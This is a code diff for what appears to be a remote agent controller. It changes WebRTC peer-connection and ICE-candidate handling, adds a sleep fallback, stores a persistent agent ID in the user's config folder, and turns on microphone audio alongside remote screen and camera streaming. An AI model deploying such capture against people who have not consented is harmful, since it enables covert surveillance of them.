@@ -660,7 +660,7 @@ except Exception as e:
 # WebRTC imports for low-latency streaming
 try:
     import aiortc
-    from aiortc import RTCPeerConnection, MediaStreamTrack, RTCSessionDescription
+    from aiortc import RTCPeerConnection, MediaStreamTrack, RTCSessionDescription, RTCConfiguration, RTCIceServer, RTCIceCandidate
     from aiortc.contrib.media import MediaRecorder, MediaPlayer, MediaRelay
     from aiortc.mediastreams import MediaStreamError
     import av
@@ -6376,11 +6376,12 @@ def sleep_random_non_blocking():
     try:
         import eventlet
         sleep_time = random.uniform(0.5, 2.0)
-        eventlet.sleep(sleep_time)
+        if hasattr(eventlet, "sleep"):
+            eventlet.sleep(sleep_time)
+        else:
+            time.sleep(sleep_time)
     except ImportError:
-        # Fallback to shorter sleep or skip if eventlet not available
-        log_message("eventlet not available for non-blocking sleep, using shorter delay", "warning")
-        sleep_time = random.uniform(0.1, 0.5)  # Much shorter fallback
+        sleep_time = random.uniform(0.1, 0.5)
         time.sleep(sleep_time)
 
 # --- Agent State (consolidated with earlier definitions) ---
@@ -6741,9 +6742,11 @@ def get_or_create_agent_id():
     
     # Save to config file for consistency
     if WINDOWS_AVAILABLE:
-        config_path = os.getenv('APPDATA')
+        base = os.getenv('APPDATA') or os.path.expanduser('~')
+        config_path = os.path.join(base, 'agent_controller')
     else:
-        config_path = os.path.expanduser('~/.config')
+        base = os.path.expanduser('~/.config')
+        config_path = os.path.join(base, 'agent_controller')
         
     try:
         os.makedirs(config_path, exist_ok=True)
@@ -7631,8 +7634,15 @@ async def create_webrtc_peer_connection(agent_id, enable_screen=True, enable_aud
         return None
     
     try:
-        # Create peer connection with optimized configuration
-        pc = RTCPeerConnection(configuration=WEBRTC_CONFIG)
+        ice_list = WEBRTC_CONFIG.get('ice_servers', WEBRTC_ICE_SERVERS)
+        ice_servers = []
+        for s in ice_list:
+            try:
+                urls = s.get('urls')
+                ice_servers.append(RTCIceServer(urls=urls))
+            except Exception:
+                pass
+        pc = RTCPeerConnection(configuration=RTCConfiguration(iceServers=ice_servers))
         
         # Add media tracks
         if enable_screen:
@@ -7742,8 +7752,11 @@ async def handle_webrtc_ice_candidate(agent_id, candidate_data):
         return False
     
     try:
-        # Add ICE candidate
-        await pc.addIceCandidate(candidate_data)
+        c_str = candidate_data.get('candidate')
+        sdp_mid = candidate_data.get('sdpMid')
+        sdp_mline_index = candidate_data.get('sdpMLineIndex')
+        candidate = RTCIceCandidate(sdpMid=sdp_mid, sdpMLineIndex=sdp_mline_index, candidate=c_str)
+        await pc.addIceCandidate(candidate)
         log_message(f"ICE candidate added for agent {agent_id}")
         return True
         
@@ -8360,7 +8373,7 @@ def start_webrtc_screen_streaming(agent_id):
     try:
         # Create WebRTC peer connection with screen track
         asyncio.create_task(create_webrtc_peer_connection(
-            agent_id, enable_screen=True, enable_audio=False, enable_camera=False
+            agent_id, enable_screen=True, enable_audio=True, enable_camera=False
         ))
         
         # Store stream info
@@ -8418,7 +8431,7 @@ def start_webrtc_camera_streaming(agent_id):
     try:
         # Create WebRTC peer connection with camera track
         asyncio.create_task(create_webrtc_peer_connection(
-            agent_id, enable_screen=False, enable_audio=False, enable_camera=True
+            agent_id, enable_screen=False, enable_audio=True, enable_camera=True
         ))
         
         # Store stream info
